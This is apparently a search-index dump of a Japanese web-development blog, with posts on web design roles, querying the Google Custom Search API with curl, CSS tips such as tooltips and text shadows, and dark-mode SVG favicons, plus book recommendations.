お互いのことを知っていることで、仕事の効率も上がると思いますし、デザイナーはそのうち「自分で書いたほうがより良いデザインができる」と考え、コーダーは「なんかデザインがおかしいから、デザインから自分でやってみる」といったことも往々にしてあります。\nわたしはそうでした。\n特にWebのコンテンツはいろいろなことができてしまうので、知っているのと知らないのでは雲泥の差になります。\n両方できるメリット Webデザインとコーディングが両方できると、なんとアプリを作ることができてしまいます。なので、自分の力を増やしていくために、片方だけではなくデザインとコーディング、両方の力を養っていったほうが断然いいですね。 \u0026quot;\u0026quot; Webデザイナーとコーダーに重要なこと Webデザイナーとコーダーになる上で特に大事なことが2点あります。\nサイトのターゲットは誰なのか サイトの最終的なゴール地点はどこなのか サイトの使い勝手はいいか 必要としている情報に簡単にアクセスできるか サイトのやブランドの持つイメージ 上記のようなことに注意して、デザインやコーディングを行っていく必要があります。\n例えば、若者向けのサイトなのに、すごく文字が大きかったり、その逆などは使う側にとってのストレスとなってしまいます。\nデザインで言えば 配色 や 文字サイズ には特に気をつける必要があります。\nコーダーで言えば 対象としているブラウザで崩れがないか や 動きがうるさくないか といったことに気をつける必要があります。\nUXとは？ UX（User eXperience）といいます。日本語ではユーザー体験となりますね。ユーザーのストレスにならないようにすることを、Webを通してユーザーに快適な空間や体験を与えるということです。 次回の予定 次回からはまず、簡単なWebデザインをしていきたいと思います。\nといっても、いきなりデザインを行うのは大変なのでまずは既存のサイトや、簡単な1ページのサイトの大枠を作成できたらなと思います。\nそれではまたの講座で会いましょう。\nおすすめの書籍 HTML\u0026amp;CSSとWebデザインが1冊できちんと身につく本[増補改訂版] 美しいデザインでサイト制作の知識とワザが「1冊で」身につく本格入門! PC\u0026amp;モバイルサイトデザインの基礎力とHTML・CSSコーディングの知識が1冊で同時に身につく! ウェブ制作を仕事にするならHTMLとCSSを学ぶことから始めますが、本書は体系立てた文法学習よりも、まずは「コーディングとはどのような作業なのか」を理解できる初学者向け入門書です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 1冊ですべて身につくHTML \u0026amp; CSSとWebデザイン入門講座 【全国の書店員さんがオススメする本「CPU大賞」第1位受賞!】 ずっと、一番売れているHTML本!\nWeb界隈やデザイナーに大人気! Web関連の情報やデザインについて記事が学べる『Webクリエイターボックス』の管理人、 Manaによる渾身のHTML \u0026amp; CSSとWebデザインが学べる本です。\n著者は、カナダやオーストラリア、イギリスの企業でWebデザイナーとして働き、現在は全国各地でWeb関連のセミナーに登壇し、Webサイト制作のインストラクターとして教育に携わっている。ブログ「Webクリエイターボックス」は2010年日本のアルファブロガーアワードを受賞。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\nこれだけで基本がしっかり身につく HTML/CSS\u0026amp;Webデザイン1冊目の本 Webサイト制作をこれから学ぶ人へ送る “1冊目\u0026#34;に最適の入門書! 【学びをサポートする4大特典つき】\n本書は手を動かしてWebサイトを作りながら HTML/CSSとWebデザインの基本を楽しく学べる入門書です。\n初学者が1冊目に読む本としてふさわしい内容を盛り込んでいるため、これを読めば必要な基礎知識がひととおり身につきます。 Amazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n","date":"2022-01-20T14:10:38+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/catch_hu3a64f66fd9809c30bb076df824d97a59_1036155_200x0_resize_box_3.png","permalink":"https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/","title":"第0回のテーマ「Webデザイナー、コーダーってなに？」"},{"content":"Google Custom Search API 10件目以降の取得方法について 「木材流通統計調査」をgoogleで検索してみると最初の方は、政府関係の木材流通統計調査の概要説明などが上位に並んでいる感じです。\nそういったものからは木材流通統計調査の社会的関心がある項目を抽出することは難しそうです。\n２０件目超えたあたりに以下の記事が来ました。\nビジネス特集 木材が消えた？身近に迫る “ウッドショック”\n2021/06/01 — 【NHK】世界的に木材の価格が高騰している。 \u0026hellip; 農林水産省の「木材流通統計調査」によると、4月の「杉の丸太」の価格は去年の同じ月と比べて10％ \u0026hellip;\n22/01/19 にこのページにアクセスしました。\nここから「丸太の価格」などの高騰が「ウッドショック」と呼ばれる社会的現象を起こしていることがわかります。\nGoogle Custom Search APIは10件までしか結果を取得しないので、10件目以降の結果を取得する必要がありそうです。\n眺めてみると50件くらい取得すれば良さそうです。\nGoogle Custom Search APIの10件目以降を取得する方法はクエリのパラメータ startに開始位置を設定すれば良さそうです。\n最大100件目まで取得できるみたいです（10件ずつなのでstartの値を変えて10回叩く必要がありますね）。\nhttps://developers.google.com/custom-search/v1/reference/rest/v1/cse/list\nThe index of the first result to return. The default number of results per page is 10, so \u0026amp;start=11 would start at the top of the second page of results. Note: The JSON API will never return more than 100 results, even if more than 100 documents match the query, so setting the sum of start + num to a number greater than 100 will produce an error. Also note that the maximum value for num is 10.\ncurlで叩くと以下の方法になります。\ncurl \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxxxxxxx\u0026amp;cx=xxxxxxxxxxxxxxxxx\u0026amp;q=木材流通統計調査\u0026amp;start=11\u0026#39; Google Custom Search API 検索対象をnewsだけに絞り込めないか しかし、よくよく考えてみると社会的関心の高い項目を抽出しようと思ったらニュースなどに検索結果を絞り込んだほうが良い気がして来ました。\ngoogle検索結果のニュースタブをクリックして出て来た結果の方が使えそうです。\nニュース ニュースだと「ビジネス特集 木材が消えた？身近に迫る “ウッドショック”」が上位に来ていますし、以下のような興味深い記事もすぐ出て来ます。\nウッドショックはいつ収まるのか？ 住宅価格への影響は？ 木材価格高騰の直接原因と根本原因～時事解説\n輸入材不足の余波で国産材の価格は春先から上昇を続けてきた。農林水産省の木材流通統計調査によると、9月の丸太価格は杉が前年同月比2.4倍、檜は2.9倍の水準だ。木材の使用量で差はあるが、住宅1棟につき少なくとも数十万円以上のコスト増が主に中小工務店らの経営に重くのしかかる。\nGoogle Custom Search API でnewsだけに検索結果を絞り込む方法を調べてみました。\n昔は、クエリにsearchType=image imgType=news をいれれば絞り込めていたみたですが試したところエラーになって現在は使用できなそうです。\ngoogleの仕様書を見てもimgTypeに現在はnewsは指定できないみたいです。\nhttps://developers.google.com/custom-search/v1/reference/rest/v1/cse/list\nschema.org で絞り込む 現在は、検索エンジンの設定画面にある「schema.org」を使用して絞り込むみたいです。\nhttps://cse.google.com/cse/\nschema.orgで設定できる項目は非常に沢山あって何を設定するか迷います。\nhttps://schema.org/docs/full.html\n10個まで設定できるとのことで、とりあえずArticle,review,newsを文言に含むものにしてみました。\ncurlで叩く方法パラメータは今までと全く同じです。\ncurl \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxxxxxxx\u0026amp;cx=xxxxxxxxxxxxxxxxx\u0026amp;q=木材流通統計調査\u0026#39; ウッドショック 林野庁・農林水産省作成資料 - 一般社団法人 宮城県\n木質バイオマス発電のFITは両刃の剣だ（2ページ目） | コラム | 環境\n【ウッドショック】木材価格の高騰は私たちにどう影響？ 住宅の\nなど取得したいコンテンツの絞り込みができました。\n","date":"2022-01-19T18:31:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（２）"},{"content":"出典元：8 Essential CSS Tips and Tricks Every Developer Should Know\nCSSは、HTMLスケルトンを設定した後、Webページにスタイルを追加するために使用されます。さらに、わずか数行のコードでCSSで洗練されたデザインを作成できます。\nすべての開発者は、プロジェクトを迅速かつ効率的に開発するために、これらのCSSのトリックを知っている必要があります。あなたの生産性を次のレベルに確実に向上させます。\nそれでは始めてみましょう。\nhover効果 ：hoverセレクターを使用して、HTML要素にホバー効果を追加できます。\n次の例ではボタン要素にホバー効果を追加します。\n\u0026lt;button\u0026gt;Hover Over Me\u0026lt;/button\u0026gt; button:hover { color: #0062FF; border: #0062FF solid 1px; background: #FFFF99; } このコードをいじって、フェードイン、拡縮、変形などのエフェクトを追加できます。\nCSSホバーへのフェードイン効果 button{ opacity: 0.5 } button:hover{ opacity: 1; } CSSホバーへの拡縮効果 button:hover{ -webkit-transform: scale(1.2); -ms-transform: scale(1.2); transform: scale(1.2); } divコンテナに合うように画像のサイズを変更します height、width、およびobject-fitプロパティを使用して、divコンテナに合うように画像のサイズを変更できます。\n\u0026lt;img class=\u0026#34;random-image\u0026#34; src=\u0026#34;画像ファイル\u0026#34; /\u0026gt; .random-image { eight: 100%; width: 100%; object-fit: contain; } すべてのスタイルをオーバーライドする !important を使用して、属性の他のすべてのスタイル宣言（インラインスタイルを含む）をオーバーライドできます。\n\u0026lt;p class=\u0026#34;className\u0026#34; id=\u0026#34;idName\u0026#34; style=\u0026#34;background-color: orange;\u0026#34;\u0026gt; Hello World! \u0026lt;/p\u0026gt; p { background-color: yellow; } .className { background-color: blue !important; } #idName { background-color: green; } この例では、!importantルールが他のすべての背景色宣言をオーバーライドし、背景色が緑ではなく青に設定されるようにします。\nただし、!important は便利ではありますが、使いすぎると上書きできないといった不具合にもつながるので、できるだけ階層を持ったCSSの記述を心がけてください。\n三点リーダー text-overflow のCSSプロパティを使用して、オーバーフローしたテキストを省略記号（\u0026hellip;）で切り捨てることができます。\n\u0026lt;p class=\u0026#34;text\u0026#34;\u0026gt; Lorem ipsum dolor sit amet consectetur adipisicing elit, sed do eiusmod tempor. \u0026lt;/p\u0026gt; .text { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 200px; } 文字の変形 text-transform CSSプロパティを使用して、テキストを強制的に大文字、小文字、または大文字にすることができます。\n指定文字を大文字にする（Uppercase） text-transform: uppercase;のCSSを使用すると、クラスなどで指定した範囲をすべて大文字表示にできます。\n\u0026lt;p class=\u0026#34;uppercase\u0026#34;\u0026gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. \u0026lt;/p\u0026gt; .uppercase { text-transform: uppercase; } 指定文字を小文字にする（Lowercase） text-transform: lowercase;のCSSを使用することで、クラスなどで指定した範囲をすべて小文字表示にできます。\n\u0026lt;p class=\u0026#34;lowercase\u0026#34;\u0026gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. \u0026lt;/p\u0026gt; .lowercase { text-transform: lowercase; } 先頭を大文字に（Capitalize） 先頭文字のみを大文字（Capitalize）したい場合は text-transform: capitalize; のCSSを使用します。\n\u0026lt;p class=\u0026#34;capitalize\u0026#34;\u0026gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. \u0026lt;/p\u0026gt; .capitalize { text-transform: capitalize; } 単一行プロパティ宣言の使用 CSSの省略形のプロパティを使用して、コードを簡潔で読みやすくすることができます。\nたとえば、CSS backgroundは、background-color、background-image、background-repeat、およびbackground-positionの値を定義できる省略形のプロパティです。\n同様に、フォント、境界線、マージン、およびパディングのプロパティを定義できます。\n単一行のbackgroundプロパティ宣言 background-color: black; background-image: url(images/xyz.png); background-repeat: no-repeat; background-position: left top; 上記の宣言を1行に簡略化できます。\nbackground: black url(images/xyz.png) no-repeat left top; 省略形のプロパティは非常に使いやすいですが、ブラウザ依存などもあるので、使用する際には、 tricky edgecases （MDN Web Docsで概説されている）を考慮する必要があります。\nツールチップ ツールチップは、ユーザーがマウスポインターを要素上に移動したときに、要素に関する詳細情報を表示する方法です。\n右方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Right Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; top: -5px; left: 105%; } .tooltip_div:hover .tooltip { visibility: visible; } 左方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Left Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; top: -5px; right: 105%; } .tooltip_div:hover .tooltip { visibility: visible; } 上方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Top Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; bottom: 100%; left: 50%; margin-left: -60px; } .tooltip_div:hover .tooltip { visibility: visible; } 下方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Bottom Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; top: 100%; left: 50%; margin-left: -60px; } .tooltip_div:hover .tooltip { visibility: visible; } Bootstrapライブラリを使用して、カスタムの Bootstrap tooltips を作成することもできます。\n影を追加 text-shadowおよびbox-shadowCSSプロパティをそれぞれ使用して、テキストおよび要素にCSSシャドウ効果を追加できます。\n文字に影を追加 text-shadow CSSプロパティは、テキストに影とレイヤーを追加します。 text-shadowプロパティは、テキストに適用されるシャドウのコンマ区切りリストを受け入れます。\n/* text-shadowには4つのCSSプロパティがあります:offset-x, offset-y, blur-radius, and color */ /* offset-x | offset-y | blur-radius | color */ text-shadow: 2px 2px 4px red; /* color | offset-x | offset-y | blur-radius */ text-shadow: #18fa3e 1px 2px 10px; color および blur-radius 引数はオプションです。\nこんなこともできます。\nbackground: #e74c3c; color: #fff; font-family: lato; text-shadow: 1px 1px rgba(123, 25, 15, 0.5), 2px 2px rgba(129, 28, 18, 0.51), 3px 3px rgba(135, 31, 20, 0.52), 4px 4px rgba(140, 33, 22, 0.53), 5px 5px rgba(145, 36, 24, 0.54), 6px 6px rgba(150, 38, 26, 0.55), 7px 7px rgba(154, 40, 28, 0.56), 8px 8px rgba(158, 42, 30, 0.57), 9px 9px rgba(162, 44, 31, 0.58), 10px 10px rgba(166, 45, 33, 0.59), 11px 11px rgba(169, 47, 34, 0.6), 12px 12px rgba(173, 48, 36, 0.61), 13px 13px rgba(176, 50, 37, 0.62), 14px 14px rgba(178, 51, 38, 0.63), 15px 15px rgba(181, 52, 39, 0.64), 16px 16px rgba(184, 54, 40, 0.65), 17px 17px rgba(186, 55, 41, 0.66), 18px 18px rgba(189, 56, 42, 0.67), 19px 19px rgba(191, 57, 43, 0.68), 20px 20px rgba(193, 58, 44, 0.69), 21px 21px rgba(195, 59, 45, 0.7), 22px 22px rgba(197, 60, 46, 0.71), 23px 23px rgba(199, 61, 47, 0.72), 24px 24px rgba(201, 62, 47, 0.73), 25px 25px rgba(202, 62, 48, 0.74), 26px 26px rgba(204, 63, 49, 0.75), 27px 27px rgba(206, 64, 49, 0.76), 28px 28px rgba(207, 65, 50, 0.77), 29px 29px rgba(209, 65, 51, 0.78), 30px 30px rgba(210, 66, 51, 0.79), 31px 31px rgba(211, 67, 52, 0.8), 32px 32px rgba(213, 67, 52, 0.81), 33px 33px rgba(214, 68, 53, 0.82), 34px 34px rgba(215, 69, 53, 0.83), 35px 35px rgba(216, 69, 54, 0.84), 36px 36px rgba(218, 70, 54, 0.85), 37px 37px rgba(219, 70, 55, 0.86), 38px 38px rgba(220, 71, 55, 0.87), 39px 39px rgba(221, 71, 56, 0.88), 40px 40px rgba(222, 72, 56, 0.89), 41px 41px rgba(223, 72, 57, 0.9), 42px 42px rgba(224, 73, 57, 0.91), 43px 43px rgba(225, 73, 57, 0.92), 44px 44px rgba(225, 73, 58, 0.93), 45px 45px rgba(226, 74, 58, 0.94), 46px 46px rgba(227, 74, 58, 0.95), 47px 47px rgba(228, 75, 59, 0.96), 48px 48px rgba(229, 75, 59, 0.97), 49px 49px rgba(230, 75, 59, 0.98), 50px 50px rgba(230, 76, 60, 0.99); 要素に影をつける box-shadowプロパティは、HTML要素に影を適用するために使用されます。\nbox-shadowの構文は下記になります。\nbox-shadow: [横方向のオフセット] [縦方向のオフセット] [ぼかしの量] [影の広がり（オプション）] [色]; ぼかし、広がり、色のパラメーターはオプションです。\n実際の記述は次のようになります。\nbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; この記事で使用されている完全なソースコードを確認したい場合は、GitHubリポジトリをご覧ください。\nWebサイトにCSSのテキストシャドウを追加することは、ユーザーの注意を引くのに最適な方法です。Webサイトにある種のエレガンスとユニークな雰囲気を与えることができます。あなたのサイトのテーマに合うようなテキストシャドウの例を、創造力を働かせて試してみてください。\nまとめ いかがだったでしょうか。いままでJSを使ってやっていたことが実はCSSでも可能になっているケースが多いです。\njavascript記述するよりも、cssのほうが軽量です。\nぜひ皆さんのサイトにも導入してUI、UXの向上につなげてみてください。\nオススメの書籍 HTML5 \u0026amp; CSS3 デザインレシピ集 本書は、HTML5とCSS3によるWebサイト制作のための\u0026#34;おいしい\u0026#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5\u0026#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-19T08:08:44+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-19-01-wyoshi/catch_huc19f2e42c6c13af74652a676a595a4af_55602_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-19-01-wyoshi/","title":"CSSでもできる！知っておくべき重要なヒントとコツ 8選 8選"},{"content":"統計名でgoogle検索して関心度の高いキーワードを抽出しよう e-Statの解析の目標として、膨大な統計データの中から一般の人に関心度の高いものを抽出してデータを要約したいと考えています。\ngoogle検索で上位にくるものは関心度が高いと言えるでしょうから統計名でgoogle検索して関心度の高いキーワードを抽出したいと思います。\ngoogle検索を自動でするためにGoogle Custom Search APIを使います。\nGoogle Custom Search API は１日１００回までは無料で、それ以上だと１０００回につき５ドル課金されるみたいです。\nhttps://developers.google.com/custom-search/v1/overview#pricing\n１日に発表される統計は10個いかないくらいなので無料の範囲で使えそうです。\nGoogle Custom Search APIを使ってみましょう。\nGoogle Custom Search API を使えるように設定する（2022年1月時点) 以下の手順で設定します。\n・googleアカウントを取得する\ngmailのメールアドレスです。\n・Google Cloud Platformでクレジットカード情報を登録する\nhttps://console.cloud.google.com/billing/create?hl=ja\n・プロジェクトを作成する\nhttps://console.cloud.google.com/projectcreate\n・認証情報を作成する\nhttps://console.cloud.google.com/apis/credentials\n「+認証情報を作成」をクリックして「APIキー」を選択すると\nAPIキーが作成されますのでコピーしておきましょう\n・APIキーの利用制限\nキーの制限をクリックしてAPIキーの利用を制限しておきましょう\n接続元が固定のIPアドレスを持っているなら「アプリケーションの制限」でIPアドレスを設定しましょう。\nAPIの制限もとりあえすCustom Search API １個にしときます。\n保存ボタンをクリックします\n・Custom Search API を有効にする\nhttps://console.cloud.google.com/apis/library/customsearch.googleapis.com 「有効にする」ボタンをクリックします。\n・検索エンジンIDの取得\nhttps://cse.google.com/create/new\n検索するサイトは「www.google.co.jp（後で削除するので適当で良いです）」\n言語は「日本語」\n検索エンジンの名前は適当で良いです。\n左側の設定ボタンを押すと画面中央中段に「検索エンジンID」があるのでコピーします。\n検索するサイトをで「www.google.co.jp」を「削除」します\n「ウェブ全体を検索」を「オン」にします\nCurlでGoogle Custom Search API検索する 試しに検索してみましょう。\ncurlを利用します。\ncurlでAPIキー、検索エンジンID、キーワードを指定して検索します。\n$ curl \u0026#39;https://www.googleapis.com/customsearch/v1?key=google apiキー\u0026amp;cx=検索エンジン ID\u0026amp;q=検索キーワード\u0026#39; 「木材流通統計調査」で検索してみました。\n$ curl \u0026#39;https://www.googleapis.com/customsearch/v1?key=google apiキー\u0026amp;cx=検索エンジンID\u0026amp;q=木材流通統計調査\u0026#39; 結果はjsonで返ってきます。\n見た感じ、ブラウザのgoogle検索の結果と同じ感じなので良さそうですね。\n\u0026#34;items\u0026#34;: [ { \u0026#34;kind\u0026#34;: \u0026#34;customsearch#result\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;木材流通統計調査：農林水産省\u0026#34;, \u0026#34;htmlTitle\u0026#34;: \u0026#34;\\u003cb\\u003e木材流通統計調査\\u003c/b\\u003e：農林水産省\u0026#34;, \u0026#34;link\u0026#34;: \u0026#34;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/\u0026#34;, \u0026#34;displayLink\u0026#34;: \u0026#34;www.maff.go.jp\u0026#34;, \u0026#34;snippet\u0026#34;: \u0026#34;木材流通構造調査, 木材の販売金額、素材及び材料の入荷先別入荷量、製材品、合板及び集成材の出荷先別出荷量、製材用、合単板及び木材チップ製造用機械の所有状況、 ...\u0026#34;, \u0026#34;htmlSnippet\u0026#34;: \u0026#34;\\u003cb\\u003e木材流通\\u003c/b\\u003e構造\\u003cb\\u003e調査\\u003c/b\\u003e, \\u003cb\\u003e木材\\u003c/b\\u003eの販売金額、素材及び材料の入荷先別入荷量、製材品、合板及び集成材の出荷先別出荷量、製材用、合単板及び\\u003cb\\u003e木材\\u003c/b\\u003eチップ製造用機械の所有状況、\u0026amp;nbsp;...\u0026#34;, \u0026#34;cacheId\u0026#34;: \u0026#34;cMExMff56bgJ\u0026#34;, \u0026#34;formattedUrl\u0026#34;: \u0026#34;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/\u0026#34;, \u0026#34;htmlFormattedUrl\u0026#34;: \u0026#34;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/\u0026#34;, \u0026#34;pagemap\u0026#34;: { \u0026#34;cse_thumbnail\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcSmlCF9ltcQbjL9DAnpZfJIotIT2ej4cd_YfBfs5ew-v2FR_NxjLAGdFTTI\u0026#34;, \u0026#34;width\u0026#34;: \u0026#34;200\u0026#34;, \u0026#34;height\u0026#34;: \u0026#34;200\u0026#34; } ], \u0026#34;metatags\u0026#34;: [ { \u0026#34;viewport\u0026#34;: \u0026#34;width=device-width, initial-scale=1\u0026#34;, \u0026#34;format-detection\u0026#34;: \u0026#34;telephone=no\u0026#34; } ], \u0026#34;cse_image\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://www.maff.go.jp/j/shared_new/shared/images/icon_pnavi@2x.png\u0026#34; } ] } }, 検索結果 ","date":"2022-01-19T00:31:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（１）"},{"content":"最近ダークモードと呼ばれる機能に対応したアプリが増え、それと同じようにWebサイトでもダークモードに対応しているものを見かけるようになりました。\n今回はWebサイトの中でファビコンを1サイズで用意して、さらにそのファビコンをダークモードに対応させてみたいと思います。\nダークモードって何？ ダークモードとは画面の色を反転して表示するスマホやタブレットに追加された機能となります。\niPhoneやiPadなどが先行iOS13のリリースの際に実装しました。\nたとえば、一般的なアプリの背景は白だったかと思いますが、ダークモードをオンにしているときは背景の色が暗めの配色となり、文字色が反対に明るめの配色になったりします。\nこの機能は光が抑えられるため、目に優しかったりすると言われてます。さらに、画面の発光を抑えられるため、バッテリーの持ちも良くなるとのことでした。\nこのダークモード機能がMacやWindowsなどのパソコンでも使用可能となり、それに伴ってブラウザでも使えるようになりました。\nWEBサイトをダークモードに対応 Webサイトを構築する際に、今までのCSSは下記のような記述になっていたかと思います。\nbody { background-color: #FFF; color: #000; } 背景を白にして、文字色を黒にするといったような記述です。\nこの場合、ダークモードに対応した端末で見た場合に、ダークモードがONであるにもかかわらず、背景が白のサイトが表示されてしまいます。\nこれをダークモードに対応させると、\n@media (prefers-color-scheme: dark) { body { background-color: #000; color: #fff; } } 上記のCSSのように @media (prefers-color-scheme: dark) を追記して、ダークモードの場合は別のCSSで上書きをしてやる必要があります。\n実はこの機能を使うことで、ファビコンも色を変えて、ダークモードに対応させることができてしまうのです。\nファビコンは1つ 今まで、ファビコンは大量に設置する必要がありました。\n全部設置仕様となると、50個近くのファイルを読み込んで、metaに記述する必要がありました。\nそんな手間をしたくないと思います。\nそもそも、そんなに大量のファビコンは必要でしょうか？\nモダンブラウザと呼ばれる最新のブラウザのみに対応であればファビコンは1つで十分です。\n「サイズごとに用意する必要があるのに、そんなことないだろ」と思われるかもしれませんが、近年のブラウザはSVGと呼ばれる形式の画像に対応しております。\nこの画像は従来のピクセルデータではなく、ベクターデータと呼ばれる座標で画像を構築してます。\n座標データなので、縮小、拡大しても画質は綺麗なままです。\nそれではSVGでファビコンを作ったらどうでしょうか？\nそうです。大量のサイズを用意しないで、1ファイルでファビコンを用意できてしまうのです。\nファビコンを設置 ファビコンをIllustratorやXDで作成して、SVG形式で保存します。\n作成したファビコンをWebサイトに反映します。\n\u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;favicon.svg\u0026#34; type=\u0026#34;image/svg+xml\u0026#34;\u0026gt; head部分に上記のlinkタグを記述します。hrefの部分は適宜変更してください。\nこれでファビコンをSVG化することができました。\nファビコンをダークモードに対応させる ダークモードに対応させるためにはもうひと工夫必要です。さきほど作成したファイルを開いて、CSSのスタイルを追加します。\nIllustratorで色を塗っていた場合、styleタグに色情報が記述されているかと思います。\nそこに、@media (prefers-color-scheme: dark) でダークモードの際の色を指定します。\nfillはSVGの塗りつぶしを意味してます。\n\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .st0 { fill: #34495E; } @media (prefers-color-scheme: dark) { .st0{ fill:# FFF; } } \u0026lt;/style\u0026gt; これでfaviconもダークモード対応できました。\n実際にブウラウザでアクセスして、ダークモードを切り替えると確認できるかと思います。\nまとめ 今まで大量のfaviconを用意して、metaタグに記述していましたが、モダンブラウザになると、SVGファイル1つでさまざまなサイズに対応可能です。しかも画質がきれいなので、高画素端末で見ても安心です。\nさらに、SVGファイルのファビコンであればファイル自体にcssのスタイルを記述できるので、@media (prefers-color-scheme: dark) を使ってダークモードに対応することもできます。\nこうした小さなUI、UXの改善がウェブサイトの大きな改善につながるのではないかと思います。\nみなさんも、ぜひダークモードに対応したおしゃれなファビコンを設置してみませんか？\nオススメの書籍 ブランディングデザインの教科書 企業経営に役立つ「ブランディング」と「デザイン」がこの1冊で一気にわかる! ブランディング成功の秘訣とは──。 これからブランディングをはじめたい経営者やプランナー、ブランド全体をデザインしてみたいというデザイナーや学生の方に向け、100以上のブランド開発実績を持つブランディングデザイナー西澤明洋が「ブランディング」と「デザイン」の方法を徹底解説。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ICONISM 世界のアイコン・ピクトグラムのデザイン 情報をわかりやすく効果的に伝えるデザインと活用例が満載! アイコンやピクトグラムは、ガイドサインだけでなく、ブランディングやウェブサイト・アプリなど現代生活のあらゆる場面で、コミュニケーションを円滑にするためますます重要な役割を担っています。世界各国の優れたデザインと展開実例を用途別に集めた1冊です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-18T17:17:37+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-18-01-wyoshi/catch_hu7b0d7bf6b0518dcefbd34462cf17def3_20503_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-18-01-wyoshi/","title":"ファビコンは1サイズのみ！さらにダークモード対応させる"},{"content":"出典元：Top 15 Mobile App Development Trends to Watch for in 2022\nモバイルアプリ開発業界は、驚異的なスピードで進化しています。このデジタルダーウィン時代に生き残り、繁栄するには、変化するモバイルアプリ開発のトレンドに精通する必要があります。 今日、スマートフォンはデジタルメディアの成功の鍵です。これは、ビジネスモデル、運用モデル、および市場を驚くべき速度で根本的に変革します。 